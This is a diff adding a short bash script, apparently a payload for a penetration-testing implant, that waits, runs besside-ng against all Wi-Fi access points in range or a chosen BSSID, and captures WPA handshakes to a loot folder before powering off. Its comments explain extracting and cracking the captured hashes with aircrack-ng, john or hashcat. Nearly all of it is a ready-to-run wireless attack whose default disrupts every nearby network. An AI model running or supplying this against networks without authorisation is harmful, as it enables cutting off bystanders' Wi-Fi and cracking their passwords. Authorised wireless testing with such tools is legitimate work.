@@ -1,0 +1,62 @@
+#!/bin/bash
+# Title: Timed-AP-Attack
+# Description: Starts an aggressive AP attack after n seconds, stops after n seconds, and then shuts down
+# Author: Saint Crossbow
+# Version: 1.0
+
+# Careful since not nicest thing to do and aggressive.
+# Check your RoE and ensure you do not get collateral damange
+# -b  Attack a specific BSSID
+# -W  Attack only WPA
+# -c  Lock on specific channel
+# Once complete, the capture files are in the /root/loot directory. Extract using:
+#   aircrack-ng -J filebase capturefile.cap
+# After that crack the hash using john or hashcat
+
+LED SETUP
+# Short fuse: starting in 5 minutes
+START_IN=300
+# Gather for 2 minutes
+GATHER_FOR=120
+# Leave blank if you want to attack all APs
+TARGET_BSSID=""
+
+echo "|_  Starting in $START_IN seconds, gathering for $GATHER_FOR seconds"
+if [ -z "$TARGET_BSSID" ]
+then
+  echo "|_  Attack all in range"
+else
+  echo "|_  Attack only $TARGET_BSSID"
+fi
+
+sleep $START_IN
+
+LED ATTACK
+
+echo "[*] Starting attack"
+
+if [ -z "$TARGET_BSSID" ]
+then
+  echo "[*] Attacking all APs in range..."
+  besside-ng wlan0 &
+  bpid=$!
+else
+  echo "[*] Attacking only $TARGET_BSSID..."
+  besside-ng -b $TARGET_BSSID wlan0 &
+  bpid=$!
+fi
+
+sleep $GATHER_FOR
+
+echo "[*] Stopping attack"
+kill $bpid
+wait $bpid
+
+mv /besside.log /root/loot
+mv /*.cap /root/loot
+sync
+
+LED SUCCESS
+
+echo "[*] Shutting down"
+poweroff
